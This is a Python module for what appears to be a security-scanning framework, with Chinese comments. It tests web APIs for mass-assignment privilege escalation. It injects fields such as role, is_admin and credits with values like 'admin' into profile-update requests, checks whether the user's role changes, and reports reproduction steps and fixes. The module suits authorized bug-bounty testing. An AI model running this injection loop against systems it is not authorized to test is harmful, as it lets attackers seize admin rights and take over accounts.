# -*- coding: utf-8 -*-
from typing import Dict, Any, List
from urllib.parse import urljoin
import json
import time
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

# 常見的權限提升相關欄位
PRIV_FIELDS = [
    "role", "roles", "is_admin", "admin", "isAdmin", "isSuperuser", "superuser",
    "privilege", "privileges", "permission", "permissions", "group", "groups", 
    "plan", "tier", "quota", "credits", "balance", "is_staff", "staff",
    "level", "access_level", "user_type", "account_type", "membership"
]

@FeatureRegistry.register
class MassAssignmentWorker(FeatureBase):
    """
    Mass Assignment / 角色升權檢測模組
    
    專門檢測透過 JSON 請求中的未授權欄位進行權限提升的漏洞。
    這類漏洞在 Bug Bounty 平台上經常能拿到 Critical 級別的高額獎金。
    
    檢測原理：
    1. 取得目標用戶的當前權限狀態
    2. 嘗試在更新請求中注入權限相關欄位
    3. 驗證權限是否真的被提升
    4. 提供完整的前後對比證據
    
    攻擊場景：
    - 個人資料更新 API 未做欄位白名單
    - 註冊 API 接受額外的角色參數
    - 設定 API 允許修改權限欄位
    """
    
    name = "mass_assignment"
    version = "2.0.0"
    tags = ["mass-assignment", "privilege-escalation", "broken-access-control", "critical"]

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 Mass Assignment 檢測
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL，如 https://app.example.com
              - path (str): 更新端點，如 /api/profile/update
              - method (str): HTTP 方法，通常是 POST/PATCH/PUT
              - headers (dict): 低權限用戶的認證頭
              - baseline_body (dict): 正常的更新請求內容
              - check_endpoint (str): 驗證權限的端點，如 /api/me
              - check_key (str): 權限檢查的欄位名，如 'role'
              - attempt_fields (list): 可選，自定義嘗試的權限欄位
              
        Returns:
            FeatureResult: 包含檢測結果和證據
        """
        http = SafeHttp()
        base = params.get("target", "")
        path = params.get("path", "")
        method = (params.get("method") or "POST").upper()
        headers = params.get("headers") or {}
        baseline = params.get("baseline_body") or {}
        check_endpoint = params.get("check_endpoint") or "/api/me"
        check_key = params.get("check_key") or "role"
        attempt_fields: List[str] = params.get("attempt_fields") or PRIV_FIELDS
        
        url = urljoin(base, path)
        findings: List[Finding] = []
        trace = []
        
        try:
            # 1) 讀取目前身分狀態
            check_url = urljoin(base, check_endpoint)
            r0 = http.request("GET", check_url, headers=headers)
            trace.append({
                "step": "baseline_check", 
                "status": r0.status_code, 
                "len": len(r0.text)
            })
            
            before = {}
            original_value = None
            if r0.status_code == 200:
                try:
                    before = r0.json()
                    original_value = before.get(check_key)
                except (ValueError, TypeError):
                    pass
            
            if not original_value:
                # 如果無法獲取基線，依然繼續測試但降低可信度
                pass
            
            # 2) 生成候選組合（小批量避免噪音）
            candidate_values = [
                "admin", "administrator", "superuser", "owner", "manager",
                True, 1, 999, "enterprise", "premium", "pro", "staff"
            ]
            
            combos = []
            for field in attempt_fields[:15]:  # 限制測試欄位數量
                for value in candidate_values[:4]:  # 限制每個欄位的測試值
                    combos.append({field: value})
                    if len(combos) >= 20:  # 總體限制，避免過度測試
                        break
                if len(combos) >= 20:
                    break
            
            # 3) 逐組測試（每組只加一個敏感欄位，降低風險）
            for i, patch in enumerate(combos):
                try:
                    injected = {**baseline, **patch}
                    
                    # 發送包含注入欄位的請求
                    r1 = http.request(
                        method, url, 
                        headers={**headers, "Content-Type": "application/json"},
                        data=json.dumps(injected)
                    )
                    
                    # 檢查更新是否成功
                    r2 = http.request("GET", check_url, headers=headers)
                    
                    trace.append({
                        "step": f"attempt_{i+1}",
                        "patch": patch,
                        "update_status": r1.status_code,
                        "check_status": r2.status_code,
                        "update_len": len(r1.text),
                        "check_len": len(r2.text)
                    })
                    
                    # 解析新的狀態
                    after = {}
                    new_value = None
                    if r2.status_code == 200:
                        try:
                            after = r2.json()
                            new_value = after.get(check_key)
                        except (ValueError, TypeError):
                            pass
                    
                    # 判斷是否成功提升權限
                    escalated = False
                    if new_value and new_value != original_value:
                        # 權限欄位值發生變化
                        escalated = True
                    elif new_value and not original_value:
                        # 原本沒有權限欄位，現在有了
                        escalated = True
                    
                    if escalated:
                        field_name = list(patch.keys())[0]
                        patch_value = patch[field_name]
                        
                        findings.append(Finding(
                            vuln_type="Mass Assignment / Privilege Escalation",
                            severity="critical",
                            title=f"權限透過 {field_name}={patch_value} 成功提升至 {new_value}",
                            evidence={
                                "changed_key": check_key,
                                "before_value": original_value,
                                "after_value": new_value,
                                "injected_field": field_name,
                                "injected_value": patch_value,
                                "request_body": injected,
                                "update_response_status": r1.status_code,
                                "before_profile": before,
                                "after_profile": after
                            },
                            reproduction=[
                                {
                                    "step": 1,
                                    "description": "檢查當前權限狀態",
                                    "request": {
                                        "method": "GET",
                                        "url": check_url,
                                        "headers": headers
                                    },
                                    "expect": f"取得 {check_key}: {original_value}"
                                },
                                {
                                    "step": 2,
                                    "description": "嘗試權限提升",
                                    "request": {
                                        "method": method,
                                        "url": url,
                                        "headers": {**headers, "Content-Type": "application/json"},
                                        "json": injected
                                    },
                                    "expect": "伺服器應拒絕未授權的權限欄位"
                                },
                                {
                                    "step": 3,
                                    "description": "驗證權限變更",
                                    "request": {
                                        "method": "GET",
                                        "url": check_url,
                                        "headers": headers
                                    },
                                    "expect": f"權限不應變更，但實際變為: {new_value}"
                                }
                            ],
                            impact="低權限用戶可透過未驗證的 JSON 欄位提升至管理員權限，完全繞過授權控制，可能導致帳戶接管、資料外洩、系統完全沦陷。",
                            recommendation="1. 實施嚴格的伺服器端欄位白名單（DTO/Serializer）\n2. 捨棄所有未明確允許的請求欄位\n3. 在後端添加額外的 ACL 檢查\n4. 權限變更需要額外的身分驗證步驟\n5. 記錄所有權限變更操作供審計"
                        ))
                        
                        # 找到一個即停止，避免過度測試
                        break
                        
                except Exception as e:
                    trace.append({
                        "step": f"attempt_{i+1}_error",
                        "patch": patch,
                        "error": str(e)
                    })
                    continue
            
            # 4) 建立命令記錄
            cmd = self.build_command_record(
                command="mass_assignment.exploit",
                description=f"Mass Assignment 權限提升檢測於 {path}",
                parameters={
                    "target": base,
                    "update_endpoint": path,
                    "check_endpoint": check_endpoint,
                    "check_key": check_key,
                    "attempts": len(combos),
                    "method": method
                }
            )
            
            return FeatureResult(
                ok=bool(findings),
                feature=self.name,
                command_record=cmd,
                findings=findings,
                meta={
                    "trace": trace,
                    "baseline_value": original_value,
                    "attempts_made": len(combos),
                    "execution_time": time.time()
                }
            )
            
        except Exception as e:
            # 處理異常情況
            cmd = self.build_command_record(
                command="mass_assignment.exploit",
                description=f"Mass Assignment 檢測失敗於 {path}",
                parameters={"target": base, "error": str(e)}
            )
            
            return FeatureResult(
                ok=False,
                feature=self.name,
                command_record=cmd,
                findings=[],
                meta={"error": str(e), "trace": trace}
            )